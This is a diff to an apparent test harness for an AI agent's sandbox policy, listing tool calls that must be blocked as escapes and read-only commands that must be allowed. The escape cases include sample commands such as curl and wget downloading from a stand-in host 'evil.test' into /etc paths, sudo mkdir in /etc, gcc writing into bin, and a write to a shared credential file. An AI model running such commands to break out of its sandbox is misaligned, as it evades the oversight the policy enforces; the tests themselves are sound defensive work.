@@ -156,8 +156,8 @@ def _cases(
         ),
         # --- wrapper commands hide the real command word -------------------
         # Each of these was an unblocked escape: the segment's command word was
-        # the wrapper, which is in no write table, so every operand — including
-        # the escaping path — was silently ignored.
+        # the wrapper, which is in no write table, so every operand - including
+        # the escaping path - was silently ignored.
         ("terminal", {"command": "sudo mkdir -p /etc/evil"}, "sudo prefix hides mkdir"),
         (
             "terminal",
@@ -211,6 +211,22 @@ def _cases(
             {"command": "unzip /tmp/p.zip -d ../out"},
             "unzip extract into the parent",
         ),
+        # --- `-o` IS a write flag for the commands that use it that way -------
+        # Scoping `-o` to a per-command allow-list (instead of the shared
+        # dir-flag set) must NOT weaken coverage for the compilers/runtimes
+        # that genuinely write via `-o`. These stay flagged outside any root.
+        ("terminal", {"command": "sort -o ../../etc/sorted sorted.txt"}, "sort -o outside"),
+        (
+            "terminal",
+            {"command": "curl -o ../../etc/leak.html https://evil.test"},
+            "curl -o outside",
+        ),
+        (
+            "terminal",
+            {"command": "wget -O ../../etc/leak.html https://evil.test"},
+            "wget -O outside",
+        ),
+        ("terminal", {"command": "gcc -o ../../bin/evil src.c"}, "gcc -o outside"),
     ]
 
     allow: List[Case] = [
@@ -255,6 +271,15 @@ def _cases(
             "tar LIST is a pure read",
         ),
         ("terminal", {"command": "unzip -l /tmp/x.zip"}, "unzip LIST is a pure read"),
+        # --- `-o` is a read-only format specifier for many commands --------
+        # `ps -o` selects columns; `git -o` likewise does not name a write
+        # target. Treating `-o` as an output flag for every command once
+        # blocked harmless read commands under the dev policy. (Note: `rsync
+        # -o` and `unzip -o` ARE real writes and must stay blocked - they are
+        # covered by the ESCAPE suite, not here.)
+        ("terminal", {"command": "ps -o pid=,command= -p 1"}, "ps -o is a format, not a write"),
+        ("terminal", {"command": "ps -o ppid="}, "ps -o ppid is a format"),
+        ("terminal", {"command": "git -o foo status"}, "git -o is not a write"),
     ]
 
     if policy == "dev":
@@ -305,7 +330,7 @@ def _cases(
                 "write into denied .git",
             ),
             # dev provisions sibling profiles, so <hermes>/profiles is
-            # writable — but the shared credential store one level up is not.
+            # writable - but the shared credential store one level up is not.
             (
                 "write_file",
                 {"path": os.path.expanduser("~/.hermes/.env"), "content": "x"},
@@ -457,7 +482,7 @@ def _cases(
                 "mkdir inside benchmark output",
             ),
             ("read_file", {"path": os.path.join(root, "Makefile")}, "READ the repo"),
-            # Telemetry stays writable so runs remain inspectable — only the
+            # Telemetry stays writable so runs remain inspectable - only the
             # control surface of the profile is denied.
             (
                 "write_file",
@@ -469,7 +494,7 @@ def _cases(
                 },
                 "write telemetry into its own profile",
             ),
-            # Spawning is allowed — it drives the per-stage adversarial
+            # Spawning is allowed - it drives the per-stage adversarial
             # sessions. jail-exec-wrap force-confines the children to this
             # same policy, so this is not an escalation.
             (
@@ -618,7 +643,7 @@ def run_policy(policy: str, verbose: bool) -> int:
 
     failures = 0
 
-    print(f"\nALLOW ({len(allow)}) — must NOT be blocked")
+    print(f"\nALLOW ({len(allow)}) - must NOT be blocked")
     for tool, args, label in allow:
         result = group._on_pre_tool_call(tool_name=tool, args=args)
         blocked = isinstance(result, dict) and result.get("action") == "block"
@@ -632,7 +657,7 @@ def run_policy(policy: str, verbose: bool) -> int:
     if not verbose:
         print(f"  {len(allow) - failures}/{len(allow)} allowed correctly")
 
-    print(f"\nESCAPE ({len(escape)}) — must ALL be blocked")
+    print(f"\nESCAPE ({len(escape)}) - must ALL be blocked")
     holes = 0
     for tool, args, label in escape:
         result = group._on_pre_tool_call(tool_name=tool, args=args)
